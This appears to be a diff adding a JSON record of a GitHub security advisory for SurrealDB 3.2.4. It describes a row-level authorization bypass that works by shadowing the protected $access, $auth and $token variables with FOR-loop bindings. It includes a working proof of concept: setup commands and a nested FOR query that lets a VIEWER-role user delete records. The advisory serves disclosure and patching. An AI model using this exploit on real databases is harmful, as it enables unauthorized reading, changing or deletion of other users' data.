@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-ffvm-mqh3-7986",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-284"
+    ],
+    "description": "### Details\r\n\r\n  SurrealDB documents $access, $auth, $token, and $session as protected variables that cannot be overwritten. Direct assignments are correctly rejected:\r\n\r\n  LET $access = 'album_like_writer';\r\n\r\n  Result:\r\n\r\n  \"'access' is a protected variable and cannot be set\"\r\n\r\n  However, the parser accepts the same name as a FOR variable:\r\n\r\n  FOR $access IN ['album_like_writer'] {\r\n      ...\r\n  };\r\n\r\n  The loop executor inserts that value into a child evaluation context without checking whether the name is protected. Context lookup returns the child value before consulting the authenticated value in the parent context. Table permissions evaluated within the loop\r\n  consequently receive the attacker-controlled value.\r\n\r\n  Relevant SurrealDB 3.2.4 source at commit 93ab219d69f09d8f999851b0359c80ebe6726102:\r\n\r\n• - Protected parameter definitions\r\n    https://github.com/surrealdb/surrealdb/blob/93ab219d69f09d8f999851b0359c80ebe6726102/surrealdb/core/src/cnf/mod.rs#L23\r\n\r\n  - FOR variable parsing\r\n    https://github.com/surrealdb/surrealdb/blob/93ab219d69f09d8f999851b0359c80ebe6726102/surrealdb/core/src/syn/parser/stmt/mod.rs#L398-L410\r\n\r\n  - FOR variable insertion into the context\r\n    https://github.com/surrealdb/surrealdb/blob/93ab219d69f09d8f999851b0359c80ebe6726102/surrealdb/core/src/expr/statements/foreach.rs#L76-L80\r\n\r\n  - Context::add_value\r\n    https://github.com/surrealdb/surrealdb/blob/93ab219d69f09d8f999851b0359c80ebe6726102/surrealdb/core/src/ctx/context.rs#L704-L713\r\n\r\n  - Local-first context lookup\r\n    https://github.com/surrealdb/surrealdb/blob/93ab219d69f09d8f999851b0359c80ebe6726102/surrealdb/core/src/ctx/context.rs#L995-L1007\r\n\r\n  - Table-permission evaluation\r\n    https://github.com/surrealdb/surrealdb/blob/93ab219d69f09d8f999851b0359c80ebe6726102/surrealdb/core/src/doc/check.rs#L449-L476\r\n\r\n  Closure arguments appear to use a similar binding path, but closure exploitation has not been confirmed.\r\n\r\n  ### PoC\r\n\r\n  The following was reproduced against:\r\n\r\n  SurrealDB 3.2.4+20260803.93ab219\r\n\r\n  Start a disposable in-memory server:\r\n\r\n  surreal start \\\r\n    --bind 127.0.0.1:8000 \\\r\n    --user root \\\r\n    --pass synthetic-root-password \\\r\n    --deny-net \\\r\n    --deny-guests \\\r\n    --deny-scripting \\\r\n    memory\r\n\r\n  In another terminal, create the synthetic database, VIEWER user, permission policy, and target record:\r\n\r\n  surreal sql \\\r\n    --endpoint ws://127.0.0.1:8000 \\\r\n    --namespace shadow \\\r\n    --database poc \\\r\n    --auth-level root \\\r\n    --username root \\\r\n    --password synthetic-root-password <<'SURQL'\r\n  DEFINE USER catalog_reader ON DATABASE\r\n    PASSWORD 'synthetic-reader-password'\r\n    ROLES VIEWER;\r\n\r\n  DEFINE TABLE users SCHEMALESS PERMISSIONS NONE;\r\n\r\n  DEFINE TABLE albumlikes SCHEMALESS\r\n    PERMISSIONS\r\n    FOR SELECT, DELETE WHERE\r\n      $access = 'album_like_writer'\r\n      AND $token.like = false\r\n      AND $auth = users:alice\r\n    FOR CREATE, UPDATE NONE;\r\n\r\n  CREATE users:alice;\r\n\r\n  CREATE albumlikes:one CONTENT {\r\n    data: {\r\n      user: 'alice',\r\n      album: 'album-one'\r\n    }\r\n  };\r\n  SURQL\r\n\r\n  Connect as the database-level VIEWER and establish the negative control:\r\n\r\n  surreal sql \\\r\n    --endpoint ws://127.0.0.1:8000 \\\r\n    --namespace shadow \\\r\n    --database poc \\\r\n    --auth-level database \\\r\n    --username catalog_reader \\\r\n    --password synthetic-reader-password <<'SURQL'\r\n  DELETE albumlikes RETURN BEFORE;\r\n  SELECT * FROM albumlikes;\r\n  LET $access = 'album_like_writer';\r\n  SURQL\r\n\r\n  The direct DELETE returns [], and the following SELECT shows that albumlikes:one remains present. The LET statement is rejected because access is protected.\r\n\r\n  Run the exploit through nested FOR bindings:\r\n\r\n  FOR $access IN ['album_like_writer'] {\r\n    FOR $token IN [{ like: false }] {\r\n      FOR $auth IN [users:alice] {\r\n        DELETE albumlikes RETURN BEFORE;\r\n      };\r\n    };\r\n  };\r\n\r\n  SELECT * FROM albumlikes;\r\n\r\n  Observed result:\r\n\r\n  -- FOR query\r\n  NONE\r\n\r\n  -- final SELECT\r\n  []\r\n\r\n  The final empty result confirms that the VIEWER deleted albumlikes:one. The same session’s direct DELETE was denied.\r\n\r\n  ### Impact\r\n\r\n  This is a table-permission and row-level authorization bypass, broadly categorized as CWE-284: Improper Access Control.\r\n\r\n  An attacker needs the ability to submit arbitrary SurrealQL to an affected database. This commonly includes applications that expose database or record-user SDK access directly to clients.\r\n\r\n  Where permission predicates trust $access, $auth, $token, or potentially $session, an attacker may be able to:\r\n\r\n  - Read records outside their authorized scope.\r\n  - Create or modify records using a forged logical identity or token scope.\r\n  - Delete records despite having only the VIEWER database role.\r\n  - Bypass caller, tenant, target, or operation restrictions encoded in table permissions.\r\n\r\n  The tested case confirms unauthorized deletion by a database VIEWER. Anonymous sessions, record-access sessions, closure arguments, other storage engines, and versions other than 3.2.4 have not yet been tested.\n\n### Patches\n\nA patch has been created that refuses a protected name (such as `$access` or `$auth`) as a FOR-loop, closure, or function parameter, so a reserved parameter can no longer be shadowed.\n\n- Version 4.0.0 and later are not affected by this issue.\n\n### References\n\n- `fix(sec): refuse a protected name as a FOR, closure or function parameter` (commit `0e7a509f5a`)\n",
+    "ghsa_id": "GHSA-ffvm-mqh3-7986",
+    "html_url": "https://github.com/surrealdb/surrealdb/security/advisories/GHSA-ffvm-mqh3-7986",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-ffvm-mqh3-7986"
+      }
+    ],
+    "published_at": "2026-11-03T15:56:53Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "  SurrealDB 3.2.4 allows FOR loop variables named $access, $auth, and $token to shadow the authenticated session values used by table permission expressions.",
+    "updated_at": "2026-11-03T15:56:53Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "rust",
+          "name": "surrealdb"
+        },
+        "patched_versions": "4.0.0",
+        "vulnerable_version_range": "< 4.0.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "surrealdb/surrealdb"
+}
